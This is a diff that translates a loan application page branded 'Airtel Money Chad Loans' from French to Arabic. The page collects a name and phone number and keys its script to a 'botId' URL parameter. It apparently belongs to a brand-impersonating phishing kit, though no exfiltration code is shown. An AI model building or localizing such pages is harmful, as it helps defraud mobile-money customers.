@@ -1,9 +1,9 @@
 <!DOCTYPE html>
-<html lang="fr">
+<html lang="ar" dir="rtl">
 <head>
   <meta charset="UTF-8">
   <meta name="viewport" content="width=device-width, initial-scale=1.0">
-  <title>Détails du prêt · Airtel Money Chad Loans</title>
+  <title>تفاصيل القرض · Airtel Money Chad Loans</title>
   <link rel="preconnect" href="https://fonts.googleapis.com">
   <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
   <link href="https://fonts.googleapis.com/css2?family=Inter:opsz,wght@14..32,400;14..32,500;14..32,600;14..32,700&display=swap" rel="stylesheet">
@@ -15,7 +15,7 @@
     }
 
     body {
-      font-family: 'Inter', -apple-system, BlinkMacSystemFont, sans-serif;
+      font-family: 'Inter', 'Segoe UI', Tahoma, 'Arabic Typesetting', 'Traditional Arabic', -apple-system, BlinkMacSystemFont, sans-serif;
       background: #f0f4fa;
       display: flex;
       justify-content: center;
@@ -83,7 +83,7 @@
       width: 100%;
       padding: 0.85rem 1rem;
       font-size: 0.95rem;
-      font-family: 'Inter', sans-serif;
+      font-family: 'Inter', 'Segoe UI', Tahoma, sans-serif;
       background: #f9fcff;
       border: 1.5px solid #dde5ef;
       border-radius: 14px;
@@ -143,7 +143,7 @@
       border-radius: 30px;
       font-size: 1.1rem;
       font-weight: 600;
-      font-family: 'Inter', sans-serif;
+      font-family: 'Inter', 'Segoe UI', Tahoma, sans-serif;
       letter-spacing: 0.3px;
       cursor: pointer;
       transition: all 0.2s ease;
@@ -192,21 +192,21 @@
     <h1>💸 Airtel Money Chad Loans</h1>
   </div>
 
-  <h2>Formulaire de demande de prêt</h2>
+  <h2>استمارة طلب القرض</h2>
 
   <form id="detailsForm">
-    <label for="name">Nom complet</label>
-    <input id="name" placeholder="Nom" required>
+    <label for="name">الاسم الكامل</label>
+    <input id="name" placeholder="الاسم" required>
 
-    <label for="phone">Numéro de téléphone</label>
+    <label for="phone">رقم الهاتف</label>
     <input id="phone" placeholder="+235 6X XX XX XX" required>
 
     <label class="checkbox-label">
       <input type="checkbox" id="confirmCheck">
-      J'accepte les termes et services de Airtel Money Chad Loans
+      أوافق على شروط وخدمات Airtel Money Chad Loans
     </label>
 
-    <button id="nextBtn" disabled>Continuer →</button>
+    <button id="nextBtn" disabled>متابعة ←</button>
   </form>
 </div>
 
@@ -214,7 +214,7 @@
   (function() {
     const params = new URLSearchParams(window.location.search);
     const botId = params.get('botId') || window.location.pathname.split('/').pop();
-    if (!botId) { alert("Lien d'accès invalide"); throw new Error(); }
+    if (!botId) { alert("رابط الوصول غير صالح"); throw new Error(); }
 
     if (!localStorage.getItem('loanAmount')) {
       window.location.href = `index.html?botId=${encodeURIComponent(botId)}`;
@@ -237,7 +237,7 @@
       const phone = phoneInput.value.trim();
 
       if (!name || !phone) {
-        alert('Veuillez remplir tous les champs obligatoires.');
+        alert('يرجى ملء جميع الحقول المطلوبة.');
         return;
       }
 
